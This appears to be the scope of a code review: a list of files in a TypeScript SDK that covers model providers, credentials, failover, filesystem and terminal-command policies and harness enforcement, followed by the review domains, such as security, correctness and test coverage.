- sdk/src/run-state.ts
- sdk/src/provider-config.ts
- sdk/src/model-discovery.ts
- sdk/src/credentials.ts
- sdk/src/impl/llm.ts
- sdk/src/impl/model-provider.ts
- sdk/src/impl/failover.ts
- sdk/src/impl/chatgpt-backend-fetch.ts
- sdk/package.json
- sdk/src/impl/__tests__/failover-integration.test.ts
- sdk/src/__tests__/chatgpt-backend-fetch.test.ts
- sdk/src/tools/filesystem-authority.ts
- sdk/src/tools/node-filesystem.ts
- sdk/src/tools/change-file.ts
- sdk/src/tools/read-policy.ts
- sdk/src/tools/terminal-command-policy.ts
- sdk/src/tools/run-terminal-command.ts
- sdk/src/tools/file-change-hooks.ts
- sdk/src/tools/mutation-capabilities.ts
- sdk/src/services/workspace-mutation-broker.ts
- sdk/src/services/workspace-journal.ts
- sdk/src/services/harness-enforcement.ts

### Domains
- security
- correctness
- state-mutation
- error-handling
- performance
- dependency-hygiene
- test-coverage
- api-contract
